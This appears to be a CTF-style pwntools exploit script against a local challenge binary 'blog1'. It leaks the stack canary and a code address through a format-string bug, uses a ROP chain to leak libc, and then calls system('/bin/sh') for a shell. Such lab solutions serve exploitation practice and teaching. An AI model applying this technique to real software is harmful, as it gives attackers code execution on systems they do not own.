# -*- coding: utf-8 -*-

from pwn import *
import pwn

context(log_level='debug', )
fileName = './blog1'

p = process(fileName)
elf = ELF(fileName)

p64 = pwn.p64
u64 = pwn.u64

'''
[*] '/home/wkyuu/Desktop/temp/blog1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# bin
bin_func_main = elf.sym['main']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x14d3    # ROPgadget --binary blog1 | grep "pop rdi"

# libc
libc_puts = 0x75db0
libc_system = 0x4a490
libc_str_bin_sh = 0x1b3115


def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))


# leak_canary
logger('leak_canary')
payload = b'aaab%15$p'  # aaab.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
canary = int(p.recv(18), 16)
logger('canary', hex(canary), 'success')

# leak_func_main
logger('leak_func_main')
payload = b'aaab%13$p'
p.sendlineafter(b'Your choice:', b'1')
p.sendlineafter(b'try to leak stack\n', payload)
p.recv(4)
leak_func_main = int(p.recv(14), 16)
bin_base = leak_func_main - bin_func_main
bin_puts_plt = bin_base + bin_puts_plt
bin_puts_got = bin_base + bin_puts_got
bin_pop_rdi_ret = bin_base + bin_pop_rdi_ret
bin_func_main = bin_base + bin_func_main

logger('bin_base', hex(bin_base), 'success')
logger('leak_func_main', hex(bin_func_main), 'success')
logger('bin_puts_plt', hex(bin_puts_plt), 'success')
logger('bin_puts_got', hex(bin_puts_got), 'success')
logger('bin_pop_rdi_ret', hex(bin_pop_rdi_ret), 'success')

# leak_libc_base
logger('leak_libc_base')
payload = b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + p64(bin_pop_rdi_ret) + \
    p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_main)
p.sendlineafter(b'Your choice:', b'3')
# gdb.attach(p)
# pause()
p.sendlineafter(b'pwn me\n', payload)
leak_libc_puts = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = leak_libc_puts - libc_puts
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_libc_puts', hex(leak_libc_puts), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'a' * (0x70 - 0x8) + p64(canary) + b'b' * 0x8 + \
    p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'Your choice:', b'3')
p.sendlineafter(b'pwn me\n', payload)

p.interactive()
